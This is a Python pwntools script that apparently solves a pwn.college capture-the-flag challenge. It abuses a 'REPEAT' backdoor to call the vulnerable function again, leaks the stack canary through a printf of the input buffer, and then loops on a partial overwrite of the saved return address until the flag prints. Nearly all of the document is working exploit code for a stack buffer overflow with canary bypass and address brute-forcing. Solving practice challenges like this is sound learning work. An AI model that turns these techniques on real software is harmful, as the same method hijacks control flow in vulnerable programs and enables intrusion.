from pwn import *
import random

'''
this challenge is similar to loop-lunacy, but the input counter is before the input buffer this time!
so we can't skip the canary by directly overwrite it

but there is a printf("%s", input_buffer) that we can leverage to leak canary

and the backdoor trick will help us:

if strstr(input_buffer, "REPEAT"):
    challenge()


Dump of assembler code for function win_authed
   0x00000000000015b4 <+0>:     endbr64
   0x00000000000015b8 <+4>:     push   rbp
   0x00000000000015b9 <+5>:     mov    rbp,rsp
   0x00000000000015bc <+8>:     sub    rsp,0x10
   0x00000000000015c0 <+12>:    mov    DWORD PTR [rbp-0x4],edi
   0x00000000000015c3 <+15>:    cmp    DWORD PTR [rbp-0x4],0x1337
   0x00000000000015ca <+22>:    jne    0x16ce <win_authed+282>
   0x00000000000015d0 <+28>:    lea    rdi,[rip+0x1b19]        # 0x30f0
   0x00000000000015d7 <+35>:    call   0x1140 <puts@plt>


'''

context.binary = elf = ELF('/challenge/recursive-ruin-easy')

fixed_byte = b'\xd0'
guess_byte = [bytes([i]) for i in range(0x5, 0x105, 0x10)]

offset2canary = 136
offset2sip = 152
backdoor_trigger = b'REPEAT'

while True:
    io = elf.process()

    io.sendline(str(offset2canary + 1).encode())

    # + 1 for overwrite last byte of canary, which is always zero
    payload1 = backdoor_trigger + b'A' * (offset2canary - len(backdoor_trigger) + 1)
    io.sendline(payload1)

    io.recvuntil(b'A' * (offset2canary - len(backdoor_trigger) + 1))
    canary = u64(io.recvn(7).rjust(8, b'\x00'))
    print(f'[+] canary: {hex(canary)}')

    # + 2 for overwrite last two significant bytes of saved rip, with one guessed
    io.sendline(str(offset2sip + 2))
    payload2 = b'A' * offset2canary + p64(canary) + b'B' * 8 + fixed_byte + random.choice(guess_byte)
    io.sendline(payload2)

    response = io.recvall()

    if b'pwn.college' in response:
        print(response.decode())
        exit()

